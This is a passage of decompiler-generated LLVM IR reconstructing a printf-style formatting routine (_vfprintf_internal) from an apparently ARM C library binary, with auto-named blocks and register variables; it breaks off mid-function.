define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp98 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i8 @__decompiler_undefined_function_3()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i32 @__decompiler_undefined_function_0()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %tmp106 = call i8 @__decompiler_undefined_function_3()
  %tmp107 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %v6_10448 = load i32, i32* @r5, align 4
  %v12_10448 = load i32, i32* @r7, align 4
  %v18_10448 = load i32, i32* @sb, align 4
  %v21_10448 = load i32, i32* @sl, align 4
  %v24_10448 = load i32, i32* @fp, align 4
  %v2_10450 = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_10450, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_10450, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_10460 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10460, i32* @r5, align 4
  %v2_10464 = call i32 @_ppfs_init(i32* nonnull %stack_var_-352)
  store i32 %v2_10464, i32* %r0.global-to-local, align 4
  %v1_1046c = icmp slt i32 %v2_10464, 0
  br i1 %v1_1046c, label %dec_label_pc_1047c, label %dec_label_pc_104b0

dec_label_pc_1047c:                               ; preds = %entry
  %v3_1047c = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_1047c, i32* @r4, align 4
  %v1_10480 = inttoptr i32 %v3_1047c to i8*
  store i32 %v3_1047c, i32* %r0.global-to-local, align 4
  %v3_10484 = call i32 @strlen(i8* %v1_10480)
  store i32 %v3_10484, i32* %r0.global-to-local, align 4
  %v2_10488 = icmp eq i32 %v3_10484, 0
  br i1 %v2_10488, label %bb, label %dec_label_pc_10498

bb:                                               ; preds = %dec_label_pc_1047c
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10b00

dec_label_pc_10498:                               ; preds = %dec_label_pc_1047c
  %v0_10498 = load i32, i32* @r4, align 4
  store i32 %v0_10498, i32* %r0.global-to-local, align 4
  %v0_1049c = load i32, i32* @fp, align 4
  store i32 %v0_1049c, i32* %r2.global-to-local, align 4
  %v3_104a0 = inttoptr i32 %v0_1049c to i16*
  %v4_104a0 = call i32 @__stdio_fwrite(i32 %v0_10498, i32 %v3_10484, i16* %v3_104a0)
  store i32 %v4_104a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10b00

dec_label_pc_104b0:                               ; preds = %entry
  %v0_104b0 = load i32, i32* @r5, align 4
  store i32 %v2_10450, i32* %r0.global-to-local, align 4
  %v2_104b8 = call i32 @_ppfs_prepargs(i32 %v2_10450, i32 %v0_104b0)
  store i32 %v2_104b8, i32* %r0.global-to-local, align 4
  store i32 2152, i32* @ip, align 4
  %v0_10500 = load i32, i32* @r4, align 4
  store i32 %v0_10500, i32* %r2.global-to-local, align 4
  %v1_10584 = bitcast i32* %stack_var_-352 to i8*
  %v4_10594 = zext i8 %tmp106 to i32
  %tmp137 = icmp slt i32 %tmp107, 1
  %v7_105a0 = ptrtoint i32* %stack_var_-272 to i32
  %v2_105b8 = ptrtoint i32* %stack_var_-40 to i32
  %v2_105d4 = icmp eq i32 %tmp104, 0
  %v2_1090c = ptrtoint i32* %stack_var_-200 to i32
  %v2_10950 = ptrtoint i32* %stack_var_-348 to i32
  %v2_10954 = ptrtoint i32* %stack_var_-72 to i32
  %v2_10808 = ptrtoint i32* %stack_var_-44 to i32
  %v2_10814 = ptrtoint i32* %stack_var_-52 to i32
  %v7_10670 = zext i8 %tmp102 to i32
  %v2_106a8 = ptrtoint i32* %stack_var_-73 to i32
  %v1_106b0 = bitcast i32* %stack_var_-73 to i8*
  %v2_106b8 = icmp ugt i32 %tmp104, 4
  %v7_106b8 = icmp eq i32 %tmp104, 5
  %v7_1059c = ptrtoint i32* %stack_var_-280 to i32
  %v5_105cc195 = icmp sgt i32 %tmp105, 0
  %tmp207 = icmp ugt i32 %tmp104, 7
  %tmp208 = icmp ugt i32 %tmp104, 15
  %v2_107dc = icmp ugt i32 %tmp104, 16
  %v7_107dc = icmp eq i32 %tmp104, 17
  %v2_107e0 = xor i1 %v7_107dc, true
  %v3_107e0 = and i1 %v2_107dc, %v2_107e0
  %v2_10864 = icmp ugt i32 %tmp104, 18
  %v7_10864 = icmp eq i32 %tmp104, 19
  %v2_10868 = xor i1 %v7_10864, true
  %v3_10868 = and i1 %v2_10864, %v2_10868
  %v7_10900 = icmp eq i32 %tmp104, 20
  %v1_10618 = add i32 %tmp104, add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -37033)
  %v2_10618 = inttoptr i32 %v1_10618 to i8*
  %v2_10644 = xor i1 %v7_106b8, true
  %v3_10644 = and i1 %v2_106b8, %v2_10644
  %v7_10678 = icmp eq i32 %tmp104, 1
  %v2_106c0 = xor i1 %v2_106b8, true
  %v3_106c0 = or i1 %v7_106b8, %v2_106c0
  %tmp209 = icmp ult i32 %tmp104, 3
  %v7_10728 = icmp eq i32 %tmp104, 3
  %v11_10734 = icmp eq i32 %tmp104, 4
  %v9_105a4 = mul nuw nsw i32 %v4_10594, 8
  %v10_105a4 = add i32 %v7_1059c, %v9_105a4
  br label %dec_label_pc_10504.outer

dec_label_pc_10504.outer:                         ; preds = %dec_label_pc_10ae4, %dec_label_pc_104b0
  %v0_1050445 = phi i32 [ %v3_10ae4, %dec_label_pc_10ae4 ], [ %v0_10500, %dec_label_pc_104b0 ]
  %v0_10638 = phi i32 [ %stack_var_-336.4, %dec_label_pc_10ae4 ], [ %tmp103, %dec_label_pc_104b0 ]
  %stack_var_-356.1.ph = phi i32 [ %stack_var_-356.3, %dec_label_pc_10ae4 ], [ 0, %dec_label_pc_104b0 ]
  br label %dec_label_pc_10504.outer36

dec_label_pc_10504.outer36:                       ; preds = %dec_label_pc_10504.outer, %dec_label_pc_10af0
  %v0_1050444 = phi i32 [ %v0_1050445, %dec_label_pc_10504.outer ], [ %v1_10af0, %dec_label_pc_10af0 ]
  %v5_10530 = phi i32 [ %v0_1050445, %dec_label_pc_10504.outer ], [ %v1_10560, %dec_label_pc_10af0 ]
  %stack_var_-356.1.ph37 = phi i32 [ %stack_var_-356.1.ph, %dec_label_pc_10504.outer ], [ %v1_109d0, %dec_label_pc_10af0 ]
  %v1_10504188 = inttoptr i32 %v0_1050444 to i8*
  %v2_10504189 = load i8, i8* %v1_10504188, align 1
  %v2_10508191 = icmp eq i8 %v2_10504189, 0
  br i1 %v2_10508191, label %dec_label_pc_10520, label %bb138

bb138:                                            ; preds = %dec_label_pc_10504.outer36, %.thread6
  %v2_10504193 = phi i8 [ %v2_10504, %.thread6 ], [ %v2_10504189, %dec_label_pc_10504.outer36 ]
  %v1_10518192 = phi i32 [ %v2_10518, %.thread6 ], [ %v0_1050444, %dec_label_pc_10504.outer36 ]
  %v8_1050c = icmp eq i8 %v2_10504193, 37
  br i1 %v8_1050c, label %dec_label_pc_10520, label %.thread6

.thread6:                                         ; preds = %bb138
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10518 = add i32 %v1_10518192, 1
  store i32 %v2_10518, i32* @r4, align 4
  %v1_10504 = inttoptr i32 %v2_10518 to i8*
  %v2_10504 = load i8, i8* %v1_10504, align 1
  %v2_10508 = icmp eq i8 %v2_10504, 0
  br i1 %v2_10508, label %dec_label_pc_10520, label %bb138

dec_label_pc_10520:                               ; preds = %bb138, %.thread6, %dec_label_pc_10504.outer36
  %v1_10518.lcssa = phi i32 [ %v0_1050444, %dec_label_pc_10504.outer36 ], [ %v2_10518, %.thread6 ], [ %v1_10518192, %bb138 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10520 = sub i32 %v1_10518.lcssa, %v5_10530
  %v9_10520 = icmp eq i32 %v1_10518.lcssa, %v5_10530
  br i1 %v9_10520, label %dec_label_pc_10554, label %dec_label_pc_10528

dec_label_pc_10528:                               ; preds = %dec_label_pc_10520
  store i32 %v2_10520, i32* @r5, align 4
  %tmp140 = icmp slt i32 %v2_10520, 1
  br i1 %tmp140, label %bb142, label %bb141

bb141:                                            ; preds = %dec_label_pc_10528
  store i32 %v5_10530, i32* %r0.global-to-local, align 4
  %v5_10538 = load i32, i32* @fp, align 4
  store i32 %v5_10538, i32* %r2.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %dec_label_pc_10528, %bb141
  %tmp143 = phi i1 [ true, %bb141 ], [ false, %dec_label_pc_10528 ]
  store i32 66880, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp143, i32 ptrtoint (i32* @global_var_15e00.625 to i32))
  %v0_10540 = load i32, i32* %r0.global-to-local, align 4
  %v1_10540 = load i32, i32* @r5, align 4
  %v9_10540 = icmp eq i32 %v0_10540, %v1_10540
  br i1 %v9_10540, label %dec_label_pc_10548, label %dec_label_pc_10af8

dec_label_pc_10548:                               ; preds = %bb142
  %v2_1054c = add i32 %v0_10540, %stack_var_-356.1.ph37
  store i32 %v2_1054c, i32* @ip, align 4
  %v0_10554.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10554

dec_label_pc_10554:                               ; preds = %dec_label_pc_10520, %dec_label_pc_10548
  %v0_10568 = phi i32 [ %v5_10530, %dec_label_pc_10520 ], [ %v0_10554.pre, %dec_label_pc_10548 ]
  %v1_109d0 = phi i32 [ %stack_var_-356.1.ph37, %dec_label_pc_10520 ], [ %v2_1054c, %dec_label_pc_10548 ]
  %v1_10554 = inttoptr i32 %v0_10568 to i8*
  %v2_10554 = load i8, i8* %v1_10554, align 1
  %v2_10558 = icmp eq i8 %v2_10554, 0
  br i1 %v2_10558, label %dec_label_pc_10b00, label %dec_label_pc_10560

dec_label_pc_10560:                               ; preds = %dec_label_pc_10554
  %v1_10560 = add i32 %v0_10568, 1
  %v2_10560 = inttoptr i32 %v1_10560 to i8*
  %v3_10560 = load i8, i8* %v2_10560, align 1
  %v7_10564 = icmp eq i8 %v3_10560, 37
  store i32 %v1_10560, i32* %r2.global-to-local, align 4
  br i1 %v7_10564, label %dec_label_pc_10af0, label %dec_label_pc_10570

dec_label_pc_10570:                               ; preds = %dec_label_pc_10560
  store i32 %v2_10450, i32* @r4, align 4
  store i32 %v2_10450, i32* %r0.global-to-local, align 4
  store i32 %v1_10560, i32* %stack_var_-352, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_10584 = call i32 @_ppfs_parsespec(i8* %v1_10584)
  store i32 %v2_10450, i32* @r0, align 4
  %v0_1058c = call i32 @_ppfs_setargs()
  store i32 %v0_1058c, i32* %r0.global-to-local, align 4
  store i32 %v4_10594, i32* @ip, align 4
  br i1 %tmp137, label %bb146, label %bb145

bb145:                                            ; preds = %dec_label_pc_10570
  br label %bb146

bb146:                                            ; preds = %dec_label_pc_10570, %bb145
  %storemerge = phi i32 [ %v10_105a4, %bb145 ], [ %v7_105a0, %dec_label_pc_10570 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_105cc195, label %dec_label_pc_105b0, label %dec_label_pc_105d0

dec_label_pc_105b0:                               ; preds = %bb146, %dec_label_pc_105b0
  %v5_105bc197 = phi i32 [ %v5_105bc, %dec_label_pc_105b0 ], [ %v2_105b8, %bb146 ]
  %v0_105b0196 = phi i32 [ %v1_105b4, %dec_label_pc_105b0 ], [ %storemerge, %bb146 ]
  %v2_105b0 = add i32 %v5_105bc197, -32
  %v3_105b0 = inttoptr i32 %v2_105b0 to i32*
  store i32 %v0_105b0196, i32* %v3_105b0, align 4
  %v0_105b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_105b4 = add i32 %v0_105b4, 8
  store i32 %v1_105b4, i32* %r0.global-to-local, align 4
  %v1_105bc.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_105bc = mul i32 %v1_105bc.pre, 4
  %v5_105bc = add i32 %v4_105bc, %v2_105b8
  %v1_105c8 = add i32 %v1_105bc.pre, 1
  store i32 %v1_105c8, i32* %r2.global-to-local, align 4
  %v5_105cc = icmp slt i32 %v1_105bc.pre, %tmp105
  br i1 %v5_105cc, label %dec_label_pc_105b0, label %dec_label_pc_105d0

dec_label_pc_105d0:                               ; preds = %dec_label_pc_105b0, %bb146
  store i32 %tmp104, i32* %r2.global-to-local, align 4
  br i1 %v2_105d4, label %dec_label_pc_105dc, label %dec_label_pc_10600

dec_label_pc_105dc:                               ; preds = %dec_label_pc_105d0
  %v3_105dc = load i32, i32* %stack_var_-72, align 4
  store i32 %v1_109d0, i32* @ip, align 4
  %v1_105e8 = inttoptr i32 %v3_105dc to i32*
  %v2_105e8 = load i32, i32* %v1_105e8, align 4
  store i32 %v2_105e8, i32* %r0.global-to-local, align 4
  %v1_105ec = and i32 %v0_10638, 3840
  store i32 %v1_109d0, i32* %r2.global-to-local, align 4
  %v3_105f4 = ashr i32 %v1_109d0, 31
  %v4_105f8 = inttoptr i32 %v2_105e8 to i16*
  %v5_105f8 = call i32 @_store_inttype(i16* %v4_105f8, i32 %v1_105ec, i32 %v1_109d0, i32 %v3_105f4)
  store i32 %v5_105f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10ae4

dec_label_pc_10600:                               ; preds = %dec_label_pc_105d0
  br i1 %tmp207, label %dec_label_pc_1079c, label %dec_label_pc_10608

dec_label_pc_10608:                               ; preds = %dec_label_pc_10600
  %v3_10618 = load i8, i8* %v2_10618, align 1
  %v4_10618 = zext i8 %v3_10618 to i32
  %v7_1061c = icmp eq i8 %v3_10618, 10
  br i1 %v7_1061c, label %dec_label_pc_10628, label %bb147

bb147:                                            ; preds = %dec_label_pc_10608
  br label %bb151

dec_label_pc_10628:                               ; preds = %dec_label_pc_10608
  %v1_10638 = and i32 %v0_10638, 64
  %v2_10638 = icmp eq i32 %v1_10638, 0
  br i1 %v2_10638, label %bb151, label %bb150

bb150:                                            ; preds = %dec_label_pc_10628
  br label %bb151

bb151:                                            ; preds = %bb147, %dec_label_pc_10628, %bb150
  br i1 %v3_10644, label %.thread, label %dec_label_pc_1064c

.thread:                                          ; preds = %bb151
  %v5_10644 = sub nsw i32 0, %v4_10618
  br label %dec_label_pc_10664

dec_label_pc_1064c:                               ; preds = %bb151
  br i1 %v7_10728, label %bb152, label %dec_label_pc_10658

bb152:                                            ; preds = %dec_label_pc_1064c
  br label %dec_label_pc_10664

dec_label_pc_10658:                               ; preds = %dec_label_pc_1064c
  br i1 %v7_10678, label %dec_label_pc_10668, label %dec_label_pc_10664

dec_label_pc_10664:                               ; preds = %.thread, %bb152, %dec_label_pc_10658
  %v0_1069081 = phi i32 [ %v5_10644, %.thread ], [ %v4_10618, %bb152 ], [ %v4_10618, %dec_label_pc_10658 ]
  br label %dec_label_pc_10668

dec_label_pc_10668:                               ; preds = %dec_label_pc_10658, %dec_label_pc_10664
  %v0_1069080 = phi i32 [ %v0_1069081, %dec_label_pc_10664 ], [ %v4_10618, %dec_label_pc_10658 ]
  %storemerge91 = phi i32 [ 11, %dec_label_pc_10664 ], [ 6, %dec_label_pc_10658 ]
  store i32 %storemerge91, i32* @r6, align 4
  %v3_10668 = load i32, i32* %stack_var_-348, align 4
  %v1_1066c = icmp slt i32 %v3_10668, 0
  %v7_10670. = select i1 %v1_1066c, i32 %v7_10670, i32 32
  store i32 %v7_10670., i32* @sb, align 4
  br i1 %v7_10678, label %bb157, label %.thread15

.thread15:                                        ; preds = %dec_label_pc_10668
  store i32 %v2_105b8, i32* %r2.global-to-local, align 4
  %v2_10680 = load i32, i32* @ip, align 4
  %v5_10680 = mul i32 %v2_10680, 4
  %v6_10680 = add i32 %v5_10680, %v2_105b8
  %v2_10684 = add i32 %v6_10680, -276
  %v3_10684 = inttoptr i32 %v2_10684 to i32*
  %v4_10684 = load i32, i32* %v3_10684, align 4
  %v2_1068c = and i32 %v4_10684, 3840
  br label %bb157

bb157:                                            ; preds = %dec_label_pc_10668, %.thread15
  %storemerge93 = phi i32 [ %v2_1068c, %.thread15 ], [ 1024, %dec_label_pc_10668 ]
  store i32 %storemerge93, i32* @r0, align 4
  store i32 %v0_1069080, i32* @r2, align 4
  %v3_10694 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_10694, i32* @r1, align 4
  %v0_10698 = call i32 @_load_inttype()
  store i32 %v0_10698, i32* @r2, align 4
  %v0_106a4 = load i32, i32* @r1, align 4
  store i32 %v0_106a4, i32* @r3, align 4
  store i32 %v2_106a8, i32* %r0.global-to-local, align 4
  %v2_106b0 = call i32 @_uintmaxtostr(i8* %v1_106b0)
  store i32 %v2_106b0, i32* %r0.global-to-local, align 4
  store i32 %v2_106b0, i32* @r4, align 4
  br i1 %v3_106c0, label %bb160, label %dec_label_pc_106c4

dec_label_pc_106c4:                               ; preds = %bb157
  %v3_106b0 = inttoptr i32 %v2_106b0 to i8*
  %v3_106c4 = load i8, i8* %v3_106b0, align 1
  %v7_106c8 = icmp eq i8 %v3_106c4, 45
  %v2_106d0 = or i32 %v0_10638, 2
  %v2_106d0.stack_var_-336.0 = select i1 %v7_106c8, i32 %v2_106d0, i32 %v0_10638
  br i1 %v7_106c8, label %.thread17, label %dec_label_pc_106e4

.thread17:                                        ; preds = %dec_label_pc_106c4
  %v3_106d4 = add i32 %v2_106b0, 1
  store i32 %v3_106d4, i32* @r4, align 4
  store i32 2, i32* @r6, align 4
  br label %bb160

dec_label_pc_106e4:                               ; preds = %dec_label_pc_106c4
  %v1_106e4 = and i32 %v2_106d0.stack_var_-336.0, 2
  %v2_106e4 = icmp eq i32 %v1_106e4, 0
  br i1 %v2_106e4, label %dec_label_pc_106f0, label %bb158

bb158:                                            ; preds = %dec_label_pc_106e4
  store i32 0, i32* @r6, align 4
  br label %bb160

dec_label_pc_106f0:                               ; preds = %dec_label_pc_106e4
  %v1_106f0 = urem i32 %v2_106d0.stack_var_-336.0, 2
  %v2_106f0 = icmp eq i32 %v1_106f0, 0
  br i1 %v2_106f0, label %bb160, label %bb159

bb159:                                            ; preds = %dec_label_pc_106f0
  store i32 4, i32* @r6, align 4
  br label %bb160

bb160:                                            ; preds = %.thread17, %bb158, %bb157, %dec_label_pc_106f0, %bb159
  %v0_1074c = phi i32 [ %v2_106b0, %bb157 ], [ %v3_106d4, %.thread17 ], [ %v2_106b0, %dec_label_pc_106f0 ], [ %v2_106b0, %bb159 ], [ %v2_106b0, %bb158 ]
  %v0_10708 = phi i32 [ %v0_10638, %bb157 ], [ %v2_106d0, %.thread17 ], [ %v0_10638, %dec_label_pc_106f0 ], [ %v0_10638, %bb159 ], [ %v0_10638, %bb158 ]
  %v3_106f8 = load i32, i32* %stack_var_-348, align 4
  %v1_10700 = icmp slt i32 %v3_106f8, 0
  br i1 %v1_10700, label %bb161, label %bb162

bb161:                                            ; preds = %bb160
  br label %bb162

bb162:                                            ; preds = %bb160, %bb161
  %storemerge206 = phi i32 [ 1, %bb161 ], [ %v3_106f8, %bb160 ]
  %v0_10730 = phi i32 [ 1, %bb161 ], [ %v3_106f8, %bb160 ]
  store i32 %storemerge206, i32* %r2.global-to-local, align 4
  %v1_10708 = and i32 %v0_10708, 16
  %v2_10708 = icmp eq i32 %v1_10708, 0
  %v2_10714 = sub i32 %v2_106a8, %v0_1074c
  store i32 %v2_10714, i32* @r5, align 4
  br i1 %v2_10708, label %bb169, label %dec_label_pc_1071c

dec_label_pc_1071c:                               ; preds = %bb162
  br i1 %tmp209, label %bb163, label %bb164

bb163:                                            ; preds = %dec_label_pc_1071c
  store i32 6, i32* @r6, align 4
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_1071c, %bb163
  br i1 %v7_10728, label %bb165, label %bb166

bb165:                                            ; preds = %bb164
  store i32 9, i32* @r6, align 4
  br label %bb166

bb166:                                            ; preds = %bb164, %bb165
  %tmp210 = icmp ugt i32 %v0_10730, %v2_10714
  br i1 %tmp210, label %bb169, label %bb167

bb167:                                            ; preds = %bb166
  br i1 %v11_10734, label %dec_label_pc_1073c, label %bb169

dec_label_pc_1073c:                               ; preds = %bb167
  %v1_1073c = inttoptr i32 %v0_1074c to i8*
  %v2_1073c = load i8, i8* %v1_1073c, align 1
  %v7_10740 = icmp eq i8 %v2_1073c, 48
  br i1 %v7_10740, label %bb168, label %.thread24

bb168:                                            ; preds = %dec_label_pc_1073c
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb169

.thread24:                                        ; preds = %dec_label_pc_1073c
  %v2_10748 = add i32 %v2_10714, 1
  store i32 %v2_10748, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %bb166, %bb168, %bb167, %bb162, %.thread24
  %v5_1078c = phi i32 [ %v0_10730, %bb167 ], [ %v0_10730, %bb162 ], [ 1, %bb168 ], [ %v2_10748, %.thread24 ], [ %v0_10730, %bb166 ]
  %v1_1074c = inttoptr i32 %v0_1074c to i8*
  %v2_1074c = load i8, i8* %v1_1074c, align 1
  %v7_10750 = icmp eq i8 %v2_1074c, 48
  br i1 %v7_10750, label %dec_label_pc_10758, label %dec_label_pc_10788

dec_label_pc_10758:                               ; preds = %bb169
  %v0_1075c = load i32, i32* @r6, align 4
  %v7_10760 = icmp slt i32 %v0_1075c, 6
  br i1 %v7_10760, label %bb171, label %bb170

bb170:                                            ; preds = %dec_label_pc_10758
  store i32 11, i32* @r6, align 4
  br label %bb171

bb171:                                            ; preds = %dec_label_pc_10758, %bb170
  br i1 %v7_10678, label %.thread27, label %dec_label_pc_1077c

.thread27:                                        ; preds = %bb171
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @ip, align 4
  store i32 5, i32* @r5, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -37060), i32* @r4, align 4
  br label %dec_label_pc_10794

dec_label_pc_1077c:                               ; preds = %bb171
  %v2_1077c = icmp eq i32 %v5_1078c, 0
  br i1 %v2_1077c, label %bb172, label %dec_label_pc_10788

bb172:                                            ; preds = %dec_label_pc_1077c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_10794

dec_label_pc_10788:                               ; preds = %dec_label_pc_1077c, %bb169
  %v2_10788 = sub i32 %v5_1078c, %v2_10714
  %tmp211 = icmp ugt i32 %v5_1078c, %v2_10714
  br i1 %tmp211, label %.thread85, label %dec_label_pc_10794

.thread85:                                        ; preds = %dec_label_pc_10788
  store i32 %v2_10788, i32* @r8, align 4
  br label %dec_label_pc_109a0thread-pre-split

dec_label_pc_10794:                               ; preds = %dec_label_pc_10788, %.thread27, %bb172
  %v1_109a4.pre205 = phi i32 [ %v2_10714, %dec_label_pc_10788 ], [ 5, %.thread27 ], [ 0, %bb172 ]
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_109a0thread-pre-split

dec_label_pc_1079c:                               ; preds = %dec_label_pc_10600
  br i1 %tmp208, label %dec_label_pc_107dc, label %dec_label_pc_107a4

dec_label_pc_107a4:                               ; preds = %dec_label_pc_1079c
  %v3_107b4 = load i32, i32* %stack_var_-72, align 4
  %v0_107b8 = load i32, i32* @fp, align 4
  store i32 %v0_107b8, i32* %r0.global-to-local, align 4
  %v1_107bc = inttoptr i32 %v3_107b4 to i32*
  %v2_107bc = load i32, i32* %v1_107bc, align 4
  store i32 %v2_107bc, i32* %r2.global-to-local, align 4
  %v3_107bc = add i32 %v3_107b4, 4
  %v4_107bc = inttoptr i32 %v3_107bc to i32*
  %v5_107bc = load i32, i32* %v4_107bc, align 4
  %v8_107c0 = call i32 @_fpmaxtostr(i32 %v0_107b8, double bitcast (i64 sext (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -91504) to i64) to double), i32 %v2_107bc, i32 %v5_107bc, i32 %v2_10950, i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -91504))
  store i32 %v8_107c0, i32* %r0.global-to-local, align 4
  %v1_107c4 = icmp slt i32 %v8_107c0, 0
  br i1 %v1_107c4, label %dec_label_pc_10af8, label %dec_label_pc_107cc

dec_label_pc_107cc:                               ; preds = %dec_label_pc_107a4
  %v2_107d0 = add i32 %v8_107c0, %v1_109d0
  store i32 %v2_107d0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10ae4

dec_label_pc_107dc:                               ; preds = %dec_label_pc_1079c
  br i1 %v3_107e0, label %dec_label_pc_10864, label %dec_label_pc_107e4

dec_label_pc_107e4:                               ; preds = %dec_label_pc_107dc
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_107ec = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_107ec, i32* %r0.global-to-local, align 4
  br i1 %v7_107dc, label %dec_label_pc_107f4, label %dec_label_pc_1082c

dec_label_pc_107f4:                               ; preds = %dec_label_pc_107e4
  %v1_107f4 = inttoptr i32 %v3_107ec to i32*
  %v2_107f4 = load i32, i32* %v1_107f4, align 4
  %v9_107f8 = icmp eq i32 %v2_107f4, 0
  store i32 %v2_107f4, i32* %stack_var_-44, align 4
  br i1 %v9_107f8, label %dec_label_pc_108a4, label %dec_label_pc_10804

dec_label_pc_10804:                               ; preds = %dec_label_pc_107f4
  %v3_10804 = load i32, i32* %stack_var_-348, align 4
  store i32 %v2_10808, i32* @r0, align 4
  %v4_1080c = ashr i32 %v3_10804, 31
  %v5_1080c = or i32 %v4_1080c, %v3_10804
  store i32 %v5_1080c, i32* %r2.global-to-local, align 4
  store i32 %v2_10808, i32* @r1, align 4
  %v6_10818 = call i32 @__GI_wcsrtombs(i32 %v2_10808, i32 %v2_10808, i32 %v5_1080c, i32 %v2_10814, i32 0, i32 %v2_107f4)
  store i32 %v6_10818, i32* %r0.global-to-local, align 4
  %v3_1081c = icmp eq i32 %v6_10818, -1
  store i32 %v6_10818, i32* @r5, align 4
  br i1 %v3_1081c, label %dec_label_pc_10af8, label %dec_label_pc_10990

dec_label_pc_1082c:                               ; preds = %dec_label_pc_107e4
  store i32 %v2_1090c, i32* %r7.global-to-local, align 4
  %v1_10830 = inttoptr i32 %v3_107ec to i32*
  %v2_10830 = load i32, i32* %v1_10830, align 4
  store i32 %v2_10814, i32* %r2.global-to-local, align 4
  store i32 %v2_1090c, i32* %r0.global-to-local, align 4
  %v5_1083c = call i32 @__GI_wcrtomb(i32 %v2_1090c, i32 %v2_10830, i32 %v2_10814, i32 %tmp105, i32 0)
  store i32 %v5_1083c, i32* %r0.global-to-local, align 4
  %v7_10840 = icmp eq i32 %v5_1083c, -1
  store i32 %v5_1083c, i32* @r5, align 4
  br i1 %v7_10840, label %dec_label_pc_10af8, label %dec_label_pc_1084c

dec_label_pc_1084c:                               ; preds = %dec_label_pc_1082c
  %v0_1084c = load i32, i32* @sl, align 4
  store i32 %v0_1084c, i32* @r8, align 4
  store i32 %v2_1090c, i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  %v1_1085c = trunc i32 %v0_1084c to i8
  %v2_1085c = load i32, i32* %r7.global-to-local, align 4
  %v4_1085c = add i32 %v2_1085c, %v5_1083c
  %v5_1085c = inttoptr i32 %v4_1085c to i8*
  store i8 %v1_1085c, i8* %v5_1085c, align 1
  %v0_109a4.pre.pre = load i32, i32* @r8, align 4
  %v1_109a4.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_109a0thread-pre-split

dec_label_pc_10864:                               ; preds = %dec_label_pc_107dc
  br i1 %v3_10868, label %dec_label_pc_10900, label %dec_label_pc_1086c

dec_label_pc_1086c:                               ; preds = %dec_label_pc_10864
  %v3_1086c = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_1086c, i32* %r0.global-to-local, align 4
  %v1_10874 = inttoptr i32 %v3_1086c to i32*
  %v2_10874 = load i32, i32* %v1_10874, align 4
  br i1 %v7_10864, label %dec_label_pc_10874, label %dec_label_pc_108d8

dec_label_pc_10874:                               ; preds = %dec_label_pc_1086c
  store i32 %v2_10874, i32* @r4, align 4
  %v2_10878 = icmp eq i32 %v2_10874, 0
  br i1 %v2_10878, label %dec_label_pc_108a4, label %dec_label_pc_10880

dec_label_pc_10880:                               ; preds = %dec_label_pc_10874, %dec_label_pc_10908
  %v0_10884 = phi i32 [ %v2_10874, %dec_label_pc_10874 ], [ %v3_10918, %dec_label_pc_10908 ]
  %v3_10880 = load i32, i32* %stack_var_-348, align 4
  store i32 %v0_10884, i32* %r0.global-to-local, align 4
  %v4_10888 = ashr i32 %v3_10880, 31
  %v5_10888 = or i32 %v4_10888, %v3_10880
  %v2_1088c = inttoptr i32 %v0_10884 to i8*
  %v3_1088c = call i32 @strnlen(i8* %v2_1088c, i32 %v5_10888)
  store i32 %v3_1088c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 %v3_1088c, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
